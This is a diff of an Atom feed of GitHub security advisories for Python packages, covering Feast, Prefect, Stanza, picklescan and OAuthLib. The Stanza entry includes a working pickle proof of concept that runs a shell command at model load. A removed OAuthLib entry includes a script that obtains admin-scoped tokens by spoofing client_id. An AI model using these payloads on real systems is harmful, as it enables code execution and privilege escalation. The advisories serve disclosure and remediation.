@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://prajeetguha.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-11-03T15:52:23.579Z</updated>
+    <updated>2026-11-03T21:31:52.282Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,190 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[feast] Feast vulnerable to unsafe deserialization RCE in registry server via UDF proto]]></title>
+        <id>https://github.com/advisories/GHSA-q63x-9pfm-mjx4</id>
+        <link href="https://github.com/advisories/GHSA-q63x-9pfm-mjx4"/>
+        <updated>2026-11-03T21:20:57.000Z</updated>
+        <content type="html"><![CDATA[<p>Feast before 0.63.0 contains an unsafe deserialization vulnerability that allows unauthenticated or unauthorized attackers to achieve remote code execution by sending a crafted gRPC request to the registry server. The user_defined_function.body field of an OnDemandFeatureView spec is decoded from base64 and passed to dill.loads() before any authorization check is performed, enabling attackers to embed a malicious serialized Python object with an arbitrary <strong>reduce</strong> method to execute OS commands as the feast service account.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56121">https://nvd.nist.gov/vuln/detail/CVE-2026-56121</a></li>
+<li><a href="https://github.com/feast-dev/feast/commit/835cda8e2c1359f1f496ad72701dbd6a73bdb25a">https://github.com/feast-dev/feast/commit/835cda8e2c1359f1f496ad72701dbd6a73bdb25a</a></li>
+<li><a href="https://github.com/feast-dev/feast/releases/tag/v0.63.0">https://github.com/feast-dev/feast/releases/tag/v0.63.0</a></li>
+<li><a href="https://huntr.com/bounties/d64b8111-180b-46ba-afa3-c877fda2ede6">https://huntr.com/bounties/d64b8111-180b-46ba-afa3-c877fda2ede6</a></li>
+<li><a href="https://www.vulncheck.com/advisories/feast-unauthenticated-rce-via-applyfeatureview-grpc-deserialization">https://www.vulncheck.com/advisories/feast-unauthenticated-rce-via-applyfeatureview-grpc-deserialization</a></li>
+<li><a href="https://access.redhat.com/security/cve/CVE-2026-56121">https://access.redhat.com/security/cve/CVE-2026-56121</a></li>
+<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2492229">https://bugzilla.redhat.com/show_bug.cgi?id=2492229</a></li>
+<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-56121.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-56121.json</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:60520">https://access.redhat.com/errata/RHSA-2026:60520</a></li>
+<li><a href="https://github.com/advisories/GHSA-q63x-9pfm-mjx4">https://github.com/advisories/GHSA-q63x-9pfm-mjx4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-q63x-9pfm-mjx4</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-24T18:32:40.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[prefect] Prefect has Git Flag Injection via commit_sha and directories Parameters Leading to Remote Code Execution (RCE)]]></title>
+        <id>https://github.com/advisories/GHSA-7pm4-56h2-5rxr</id>
+        <link href="https://github.com/advisories/GHSA-7pm4-56h2-5rxr"/>
+        <updated>2026-11-03T21:18:14.000Z</updated>
+        <content type="html"><![CDATA[<p>Prefect versions 3.1.11 through 3.6.24 are vulnerable to remote code execution due to improper handling of user-controlled input in the <code>GitRepository</code> storage class. The <code>commit_sha</code> parameter, which is passed to git commands, lacks validation and does not include a <code>--</code> separator to distinguish user input from git flags. This allows attackers to inject arbitrary git flags, such as <code>--upload-pack</code>, enabling execution of external programs. Additionally, the <code>directories</code> parameter can be exploited to inject git flags during sparse-checkout operations. These vulnerabilities allow any user with deployment creation permissions to execute arbitrary commands on worker machines, compromising shared work pools in multi-tenant environments.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5366">https://nvd.nist.gov/vuln/detail/CVE-2026-5366</a></li>
+<li><a href="https://huntr.com/bounties/e2e88a0f-a8f6-49c9-94c5-e98dc385f07a">https://huntr.com/bounties/e2e88a0f-a8f6-49c9-94c5-e98dc385f07a</a></li>
+<li><a href="https://github.com/PrefectHQ/prefect/pull/21384">https://github.com/PrefectHQ/prefect/pull/21384</a></li>
+<li><a href="https://github.com/PrefectHQ/prefect/commit/6a9d9918716ce4ee0297b69f3046f7067ef1faae">https://github.com/PrefectHQ/prefect/commit/6a9d9918716ce4ee0297b69f3046f7067ef1faae</a></li>
+<li><a href="https://github.com/advisories/GHSA-7pm4-56h2-5rxr">https://github.com/advisories/GHSA-7pm4-56h2-5rxr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7pm4-56h2-5rxr</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-20T18:31:29.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[stanza] Stanza: RCE via pickle deserialization in the lemmatizer]]></title>
+        <id>https://github.com/advisories/GHSA-gh9r-c94j-cmp5</id>
+        <link href="https://github.com/advisories/GHSA-gh9r-c94j-cmp5"/>
+        <updated>2026-11-03T20:29:16.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="tldr">TL;DR</h2>
+<p>Loading an attacker-supplied lemma <code>.pt</code> runs arbitrary code as the loading user. Since 1.14.0 the lemmatizer stores <code>pos_dict</code> as a gzip-compressed pickle in the checkpoint's <code>dicts</code> field (a <code>bytes</code> value). <code>torch.load(weights_only=True)</code> treats <code>bytes</code> as a primitive and passes it through unexamined, so its allowlist never sees the inner stream. <code>Trainer.load</code> then feeds those bytes to an <strong>unrestricted <code>pickle.loads</code></strong>: the only bare <code>pickle.loads</code> in the tree. Result: <code>weights_only=True</code> gives no protection here, and model loading executes code.</p>
+<p>Confirmed end-to-end against stanza 1.14.0 / PyTorch 2.13.0 / CPython 3.13.7: a crafted checkpoint whose payload <code>__reduce__</code> returns <code>(os.system, (cmd,))</code> ran the command at load time (marker file showed <code>uid=501(...)</code>, <code>executed_by=...</code>).</p>
+<p>A downstream user is vulnerable whenever they build a pipeline that loads a caller-supplied lemmatizer checkpoint. i.e. <code>stanza.Pipeline(lang=..., processors="tokenize,pos,lemma", lemma_model_path="&lt;attacker-influenced .pt&gt;")</code> (or any equivalent load of an untrusted/shared lemma model through a custom registry) - since that call routes straight into <code>Trainer.load</code> -&gt; <code>_unpack_pos_dict</code> and executes the embedded pickle at construction time.</p>
+<h2 id="the-vulnerable-path">The vulnerable path</h2>
+<p><code>stanza/models/lemma/trainer.py</code>:</p>
+<pre><code class="language-python"># _pack_pos_dict (write side): pos_dict -&gt; pickle -&gt; gzip -&gt; bytes, stored under checkpoint['dicts']
+
+def _unpack_pos_dict(data):                 # line 54
+    buf = io.BytesIO(data)
+    with gzip.GzipFile(fileobj=buf, mode="rb") as gz:
+        raw = gz.read()
+    return pickle.loads(raw)                # &lt;-- unrestricted default unpickler
+</code></pre>
+<pre><code class="language-python">def load(self, filename, ...):              # line 365
+    checkpoint = torch.load(filename, ..., weights_only=True)   # outer allowlist; bytes pass through intact
+    ...
+    if dicts_version == _DICTS_VERSION_POS:                     # dicts_version == 2 (current format)
+        self.pos_dict = _unpack_pos_dict(checkpoint['dicts'])   # line 378, no validation
+</code></pre>
+<p><strong>Reachable from the documented API.</strong> <code>stanza.Pipeline(..., lemma_model_path=&lt;file&gt;)</code> -&gt; <code>LemmaProcessor._set_up_model</code> -&gt; <code>Trainer(model_file=…)</code> -&gt; <code>Trainer.load</code>. Any shared/distributed checkpoint, custom registry, or caller-supplied <code>lemma_model_path</code> reaches it. No checksum is applied to caller-supplied paths (MD5 verification exists only in the default registry download flow). Trigger is at pipeline construction, before any inference input is processed.</p>
+<p>Note: this is <strong>not</strong> the <code>weights_only=False</code> fallback fixed under CVE-2026-54499: the outer load stays safe; the exposure is entirely the inner pickle.</p>
+<h2 id="minimal-poc">Minimal PoC</h2>
+<pre><code class="language-python">import gzip, io, os, pickle, tempfile, torch
+from stanza.models.lemma.trainer import _unpack_pos_dict, _DICTS_VERSION_POS
+
+MARKER = os.path.join(tempfile.gettempdir(), "stanza_lemma_poc_pwned")
+
+class Payload:
+    def __reduce__(self):
+        return (os.system, ("id &gt; %s 2&gt;&amp;1; echo executed_by=$(whoami) &gt;&gt; %s" % (MARKER, MARKER),))
+
+buf = io.BytesIO()
+with gzip.GzipFile(fileobj=buf, mode="wb") as gz:        # same shape as _pack_pos_dict()
+    gz.write(pickle.dumps(Payload(), protocol=4))
+
+ckpt = {"dicts": buf.getvalue(), "dicts_version": _DICTS_VERSION_POS}
+pt = os.path.join(tempfile.gettempdir(), "evil_lemma.pt")
+torch.save(ckpt, pt, _use_new_zipfile_serialization=False)
+
+loaded = torch.load(pt, lambda s, l: s, weights_only=True)   # SUCCEEDS; dicts is bytes, intact
+_unpack_pos_dict(loaded["dicts"])                            # == trainer.py:378 -&gt; command runs
+print("pwned:", open(MARKER).read().strip())
+</code></pre>
+<p>The PoC calls <code>_unpack_pos_dict</code> directly: the exact expression at <code>trainer.py:378</code>. Reaching it through <code>stanza.Pipeline(...)</code> additionally requires the crafted file to carry a well-formed <code>config</code>/<code>vocab</code> so <code>load</code> runs to line 378 (established by source review); the deserialization to execution step is confirmed at runtime.</p>
+<h2 id="fix">Fix</h2>
+<p>Deserialize the inner stream with the <code>RestrictedUnpickler</code> the project already uses in <code>stanza/models/common/doc.py</code> (allowlists <code>tuple</code>/<code>list</code>/<code>dict</code> only):</p>
+<pre><code class="language-python">from stanza.models.common.doc import RestrictedUnpickler
+
+def _unpack_pos_dict(data):
+    buf = io.BytesIO(data)
+    with gzip.GzipFile(fileobj=buf, mode="rb") as gz:
+        raw = gz.read()
+    return RestrictedUnpickler(io.BytesIO(raw)).load()
+</code></pre>
+<p>A legitimate <code>pos_dict</code> is a nested <code>{pos: {word: lemma}}</code> string mapping no class/function globals, so it loads cleanly, while any <code>os.system</code>-style payload is rejected by <code>find_class</code>. JSON would work equally well (all keys/values are strings) and remove pickle from this path entirely. Apply to both <code>_unpack_pos_dict</code> and, for forward compatibility, <code>_pack_pos_dict</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/stanfordnlp/stanza/security/advisories/GHSA-gh9r-c94j-cmp5">https://github.com/stanfordnlp/stanza/security/advisories/GHSA-gh9r-c94j-cmp5</a></li>
+<li><a href="https://github.com/stanfordnlp/stanza/pull/1649">https://github.com/stanfordnlp/stanza/pull/1649</a></li>
+<li><a href="https://github.com/stanfordnlp/stanza/commit/b21e1c9b47b4fccff21d3b0a6c0687a19410c2f0">https://github.com/stanfordnlp/stanza/commit/b21e1c9b47b4fccff21d3b0a6c0687a19410c2f0</a></li>
+<li><a href="https://github.com/stanfordnlp/stanza/releases/tag/v1.15.0">https://github.com/stanfordnlp/stanza/releases/tag/v1.15.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-gh9r-c94j-cmp5">https://github.com/advisories/GHSA-gh9r-c94j-cmp5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gh9r-c94j-cmp5</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-11-03T20:29:16.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[picklescan] Duplicate Advisory : Picklescan is missing detection when calling built-in python idlelib.pyshell.ModifiedInterpreter.runcode]]></title>
+        <id>https://github.com/advisories/GHSA-mq7r-vm99-p7vx</id>
+        <link href="https://github.com/advisories/GHSA-mq7r-vm99-p7vx"/>
+        <updated>2026-11-03T17:37:07.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
+<p>This advisory has been withdrawn because it is a duplicate of GHSA-3gf5-cxq9-w223. This link is maintained to preserve external references.</p>
+<h3 id="original-description">Original Description</h3>
+<p>picklescan through 0.0.26 fails to detect malicious pickle files that invoke idlelib.pyshell.ModifiedInterpreter.runcode in <strong>reduce</strong> methods. Attackers can embed undetected code in pickle files that executes arbitrary commands when the file is loaded via pickle.load(), enabling supply chain attacks on PyTorch models and saved Python objects. This is fixed in version 0.0.30.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/mmaitre314/picklescan/security/advisories/GHSA-3gf5-cxq9-w223">https://github.com/mmaitre314/picklescan/security/advisories/GHSA-3gf5-cxq9-w223</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71340">https://nvd.nist.gov/vuln/detail/CVE-2025-71340</a></li>
+<li><a href="https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-idlelib-pyshell-modifiedinterpreter-runcode">https://www.vulncheck.com/advisories/picklescan-remote-code-execution-via-idlelib-pyshell-modifiedinterpreter-runcode</a></li>
+<li><a href="https://github.com/advisories/GHSA-mq7r-vm99-p7vx">https://github.com/advisories/GHSA-mq7r-vm99-p7vx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mq7r-vm99-p7vx</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-26T00:32:05.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[feast] Feast vulnerable to arbitrary code execution via unsafe deserialization of dill-serialized UDFs]]></title>
+        <id>https://github.com/advisories/GHSA-gg2p-37pv-v7fq</id>
+        <link href="https://github.com/advisories/GHSA-gg2p-37pv-v7fq"/>
+        <updated>2026-11-03T16:23:47.000Z</updated>
+        <content type="html"><![CDATA[<p>A flaw was found in Feast. The system improperly deserializes user-defined functions (UDFs) stored in its registry, which are serialized using the 'dill' library. This allows a remote attacker to store a malicious UDF, leading to unauthenticated arbitrary code execution on the feature server in default configurations. An authenticated attacker can also achieve arbitrary code execution on the registry server by bypassing authorization checks during deserialization. This vulnerability can result in cross-tenant data access and lateral movement within the system.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-18948">https://nvd.nist.gov/vuln/detail/CVE-2026-18948</a></li>
+<li><a href="https://access.redhat.com/security/cve/CVE-2026-18948">https://access.redhat.com/security/cve/CVE-2026-18948</a></li>
+<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2511167">https://bugzilla.redhat.com/show_bug.cgi?id=2511167</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:53263">https://access.redhat.com/errata/RHSA-2026:53263</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:53261">https://access.redhat.com/errata/RHSA-2026:53261</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:53262">https://access.redhat.com/errata/RHSA-2026:53262</a></li>
+<li><a href="https://access.redhat.com/errata/RHSA-2026:60520">https://access.redhat.com/errata/RHSA-2026:60520</a></li>
+<li><a href="https://github.com/feast-dev/feast/issues/6827">https://github.com/feast-dev/feast/issues/6827</a></li>
+<li><a href="https://github.com/feast-dev/feast/pull/6861">https://github.com/feast-dev/feast/pull/6861</a></li>
+<li><a href="https://github.com/feast-dev/feast/commit/e0ef16ea1ed149ecd5dc9d4d0aa0fdbfa547f861">https://github.com/feast-dev/feast/commit/e0ef16ea1ed149ecd5dc9d4d0aa0fdbfa547f861</a></li>
+<li><a href="https://github.com/feast-dev/feast/releases/tag/v0.67.0">https://github.com/feast-dev/feast/releases/tag/v0.67.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-gg2p-37pv-v7fq">https://github.com/advisories/GHSA-gg2p-37pv-v7fq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gg2p-37pv-v7fq</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-08-10T21:32:07.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[apache-airflow] Apache Airflow: Authenticated users can bypass the `is_safe_url` check]]></title>
         <id>https://github.com/advisories/GHSA-6hcw-qqr8-pjj8</id>
@@ -945,751 +1129,5 @@ def validate(*args, **kwargs):
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-10-30T22:58:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[oauthlib] OAuthLib: Token grants can use attacker-supplied client_id for authorization after authenticating a different client]]></title>
-        <id>https://github.com/advisories/GHSA-7984-qgvg-3j9c</id>
-        <link href="https://github.com/advisories/GHSA-7984-qgvg-3j9c"/>
-        <updated>2026-10-30T22:58:18.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>OAuthlib's token grant handlers can authenticate one client while authorizing the grant type and requested scopes using a different, attacker-supplied <code>client_id</code> from the request body.</p>
-<p>In affected token grant flows, <code>authenticate_client(request)</code> sets <code>request.client</code> to the authenticated client object, but OAuthlib does not require <code>request.client_id</code> to match <code>request.client.client_id</code>. If the request body already contains <code>client_id=...</code>, OAuthlib keeps that value and passes it to <code>validate_grant_type()</code> and <code>validate_scopes()</code>.</p>
-<p>As a result, an authenticated low-privilege confidential client can authenticate as itself, submit another client's <code>client_id</code> in the token request body, and cause grant and scope validation to run under that other client identity.</p>
-<h2 id="affected-surface">Affected Surface</h2>
-<p>The affected public surface is the OAuth2 token endpoint handling for:</p>
-<ul>
-<li><code>client_credentials</code></li>
-<li><code>password</code> / Resource Owner Password Credentials</li>
-</ul>
-<p>The issue is relevant to OAuthlib provider deployments where:</p>
-<ul>
-<li>the attacker has credentials for one valid lower-privilege confidential client;</li>
-<li>another client has broader grants or scopes;</li>
-<li>the application validator uses the <code>client_id</code> argument passed by OAuthlib in <code>validate_grant_type()</code> or <code>validate_scopes()</code>, as the <code>RequestValidator</code> API is designed to support.</li>
-</ul>
-<p>Deployments whose validators ignore the <code>client_id</code> argument and authorize only from <code>request.client</code> may not be affected.</p>
-<h2 id="details">Details</h2>
-<p><code>Request</code> parses query and body parameters into request attributes, including <code>client_id</code>:</p>
-<ul>
-<li><a href="https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/common.py#L360-L397">https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/common.py#L360-L397</a></li>
-</ul>
-<p>The <code>RequestValidator.authenticate_client()</code> contract requires the integrator to authenticate the client and set <code>request.client</code>:</p>
-<ul>
-<li><a href="https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/request_validator.py#L41-L66">https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/request_validator.py#L41-L66</a></li>
-</ul>
-<p>For the <code>client_credentials</code> grant, OAuthlib authenticates the client, verifies that <code>request.client</code> has a <code>client_id</code>, then performs grant and scope validation before normalizing <code>request.client_id</code> from <code>request.client.client_id</code>:</p>
-<ul>
-<li><a href="https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py#L106-L119">https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py#L106-L119</a></li>
-</ul>
-<p>The problematic order is:</p>
-<pre><code class="language-python">if not self.request_validator.authenticate_client(request):
-    ...
-elif not hasattr(request.client, 'client_id'):
-    ...
-
-self.validate_grant_type(request)
-
-request.client_id = request.client_id or request.client.client_id
-self.validate_scopes(request)
-</code></pre>
-<p>Because OAuthlib only fills <code>request.client_id</code> when it is missing, an attacker-supplied body value such as <code>client_id=high</code> survives even when <code>request.client.client_id == "low"</code>.</p>
-<p>The shared grant helper then authorizes using <code>request.client_id</code>, while passing the authenticated client object separately:</p>
-<ul>
-<li><code>validate_grant_type(request.client_id, request.grant_type, request.client, request)</code>: <a href="https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/base.py#L152-L162">https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/base.py#L152-L162</a></li>
-<li><code>validate_scopes(request.client_id, request.scopes, request.client, request)</code>: <a href="https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/base.py#L164-L176">https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/base.py#L164-L176</a></li>
-</ul>
-<p>The same identity split exists in the Resource Owner Password Credentials flow. After client authentication and user validation, OAuthlib validates the grant and scopes before replacing a missing <code>request.client_id</code> from <code>request.client.client_id</code>:</p>
-<ul>
-<li><a href="https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py#L87-L97">https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py#L87-L97</a></li>
-<li><a href="https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py#L178-L195">https://github.com/oauthlib/oauthlib/blob/b3f9edffed6b370e3eb92721cea0da22ec7e18b9/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py#L178-L195</a></li>
-</ul>
-<p>This creates an inconsistent identity state:</p>
-<pre><code class="language-text">request.client.client_id == "low"   # authenticated client
-request.client_id == "high"         # attacker-supplied request parameter
-</code></pre>
-<p>OAuthlib then calls application authorization hooks with both values, but uses the attacker-controlled <code>request.client_id</code> as the first-class <code>client_id</code> argument.</p>
-<h2 id="impact">Impact</h2>
-<p>An authenticated lower-privilege confidential client can obtain tokens authorized under another client's grant and scope policy if the application's validator follows the <code>RequestValidator</code> API and authorizes by the <code>client_id</code> argument.</p>
-<p>Concrete impact can include:</p>
-<ul>
-<li>issuing access tokens with scopes not assigned to the authenticated client;</li>
-<li>allowing a low-privilege client to use a grant type reserved for a higher-privilege client;</li>
-<li>persisting tokens under a spoofed <code>client_id</code> while the authenticated client object is different.</li>
-</ul>
-<p>This is a token authorization bypass, not an unauthenticated attack. The attacker needs valid credentials for one client.</p>
-<h2 id="poc">PoC</h2>
-<p>Create the following files in an empty directory.</p>
-<p><code>requirements.txt</code>:</p>
-<pre><code class="language-text">oauthlib==3.3.1
-</code></pre>
-<p><code>repro.py</code>:</p>
-<pre><code class="language-python">import base64
-import json
-
-from oauthlib.oauth2 import (
-    BearerToken,
-    ClientCredentialsGrant,
-    RequestValidator,
-    ResourceOwnerPasswordCredentialsGrant,
-    TokenEndpoint,
-)
-
-
-class Client:
-    def __init__(self, client_id):
-        self.client_id = client_id
-
-
-CLIENTS = {
-    "low": {
-        "secret": "low-secret",
-        "grants": {"client_credentials", "password"},
-        "scopes": {"read"},
-    },
-    "high": {
-        "secret": "high-secret",
-        "grants": {"client_credentials", "password"},
-        "scopes": {"read", "admin"},
-    },
-}
-
-
-class DemoValidator(RequestValidator):
-    def __init__(self):
-        self.saved_tokens = []
-
-    def authenticate_client(self, request, *args, **kwargs):
-        authorization = request.headers.get("Authorization", "")
-        prefix = "Basic "
-        if not authorization.startswith(prefix):
-            return False
-
-        decoded = base64.b64decode(authorization[len(prefix):]).decode("utf-8")
-        client_id, secret = decoded.split(":", 1)
-        record = CLIENTS.get(client_id)
-        if record is None or record["secret"] != secret:
-            return False
-
-        # This is the authenticated client identity.
-        request.client = Client(client_id)
-        return True
-
-    def client_authentication_required(self, request, *args, **kwargs):
-        return True
-
-    def validate_grant_type(self, client_id, grant_type, client, request, *args, **kwargs):
-        record = CLIENTS.get(client_id)
-        return record is not None and grant_type in record["grants"]
-
-    def validate_scopes(self, client_id, scopes, client, request, *args, **kwargs):
-        record = CLIENTS.get(client_id)
-        return record is not None and set(scopes or []) &lt;= record["scopes"]
-
-    def get_default_scopes(self, client_id, request, *args, **kwargs):
-        return []
-
-    def validate_user(self, username, password, client, request, *args, **kwargs):
-        if username == "alice" and password == "wonderland":
-            request.user = username
-            return True
-        return False
-
-    def save_bearer_token(self, token, request, *args, **kwargs):
-        self.saved_tokens.append({
-            "token": dict(token),
-            "authenticated_client_id": request.client.client_id,
-            "request_client_id": request.client_id,
-            "scopes": list(request.scopes or []),
-        })
-
-
-validator = DemoValidator()
-token = BearerToken(validator, expires_in=3600)
-endpoint = TokenEndpoint(
-    default_grant_type="client_credentials",
-    default_token_type=token,
-    grant_types={
-        "client_credentials": ClientCredentialsGrant(validator),
-        "password": ResourceOwnerPasswordCredentialsGrant(validator),
-    },
-)
-
-
-def low_client_headers():
-    value = base64.b64encode(b"low:low-secret").decode("ascii")
-    return {"Authorization": f"Basic {value}"}
-
-
-def token_request(body):
-    _headers, response_body, status = endpoint.create_token_response(
-        "https://auth.example/token",
-        body=body,
-        headers=low_client_headers(),
-    )
-    return status, json.loads(response_body)
-
-
-def assert_rejected(label, body):
-    status, response = token_request(body)
-    print(label, status, response)
-    if status == 200:
-        raise SystemExit(f"{label}: expected rejection, got success")
-
-
-def assert_spoofed_success(label, body):
-    status, response = token_request(body)
-    print(label, status, response)
-    if status != 200:
-        raise SystemExit(f"{label}: expected token, got {status} {response}")
-    if response.get("scope") != "admin":
-        raise SystemExit(f"{label}: expected admin scope, got {response}")
-
-    saved = validator.saved_tokens[-1]
-    if saved["authenticated_client_id"] != "low":
-        raise SystemExit(f"{label}: authenticated client changed unexpectedly: {saved}")
-    if saved["request_client_id"] != "high":
-        raise SystemExit(f"{label}: spoofed request client_id was not preserved: {saved}")
-
-
-assert_rejected(
-    "control client_credentials as low requesting admin",
-    "grant_type=client_credentials&amp;client_id=low&amp;scope=admin",
-)
-assert_spoofed_success(
-    "spoofed client_credentials as low with client_id=high",
-    "grant_type=client_credentials&amp;client_id=high&amp;scope=admin",
-)
-
-assert_rejected(
-    "control password as low requesting admin",
-    "grant_type=password&amp;client_id=low&amp;username=alice&amp;password=wonderland&amp;scope=admin",
-)
-assert_spoofed_success(
-    "spoofed password as low with client_id=high",
-    "grant_type=password&amp;client_id=high&amp;username=alice&amp;password=wonderland&amp;scope=admin",
-)
-
-print("OAUTHLIB_CLIENT_ID_SPOOFING_CONFIRMED")
-print(json.dumps(validator.saved_tokens, indent=2, sort_keys=True))
-</code></pre>
-<p>Run:</p>
-<pre><code class="language-bash">python -m venv .venv
-. .venv/bin/activate
-python -m pip install -r requirements.txt
-python repro.py
-</code></pre>
-<p>Expected result:</p>
-<pre><code class="language-text">control client_credentials as low requesting admin 400 {'error': 'invalid_scope'}
-spoofed client_credentials as low with client_id=high 200 {'access_token': '...', 'expires_in': 3600, 'token_type': 'Bearer', 'scope': 'admin'}
-control password as low requesting admin 400 {'error': 'invalid_scope'}
-spoofed password as low with client_id=high 200 {'access_token': '...', 'expires_in': 3600, 'token_type': 'Bearer', 'scope': 'admin', 'refresh_token': '...'}
-OAUTHLIB_CLIENT_ID_SPOOFING_CONFIRMED
-</code></pre>
-<p>The success condition is that both successful token responses are produced while the saved token state shows:</p>
-<pre><code class="language-json">{
-  "authenticated_client_id": "low",
-  "request_client_id": "high",
-  "scopes": ["admin"]
-}
-</code></pre>
-<p>That demonstrates that the authenticated client is <code>low</code>, while grant and scope authorization used the attacker-supplied <code>client_id=high</code>.</p>
-<h2 id="suggested-remediation">Suggested Remediation</h2>
-<p>After client authentication succeeds, OAuthlib should reject a token request if an explicit request <code>client_id</code> is present and does not match <code>request.client.client_id</code>.</p>
-<p>For authenticated confidential-client flows, a safer invariant is:</p>
-<pre><code class="language-python">if request.client is not None:
-    if request.client_id is not None and request.client_id != request.client.client_id:
-        raise InvalidClientError(...)
-    request.client_id = request.client.client_id
-</code></pre>
-<p>This should happen before <code>validate_grant_type()</code> and <code>validate_scopes()</code> are called.</p>
-<p>Reporters:</p>
-<ul>
-<li><a href="mailto:liyi.zhou@sydney.edu.au">liyi.zhou@sydney.edu.au</a> (Liyi), <a href="https://lzhou1110.github.io/">https://lzhou1110.github.io/</a></li>
-<li><a href="mailto:ziyue0530@gmail.com">ziyue0530@gmail.com</a> (Ziyue), <a href="https://zyy0530.github.io/">https://zyy0530.github.io/</a></li>
-<li><a href="mailto:cshe0476@uni.sydney.edu.au">cshe0476@uni.sydney.edu.au</a> (Strick), <a href="https://str1ckl4nd.github.io/">https://str1ckl4nd.github.io/</a></li>
-<li><a href="mailto:chng0012@uni.sydney.edu.au">chng0012@uni.sydney.edu.au</a> (Maurice), <a href="http://maurice.busystar.org/">http://maurice.busystar.org/</a></li>
-<li><a href="mailto:cyu210608@gmail.com">cyu210608@gmail.com</a> (Chenchen), <a href="https://7thparkk.github.io/">https://7thparkk.github.io/</a></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
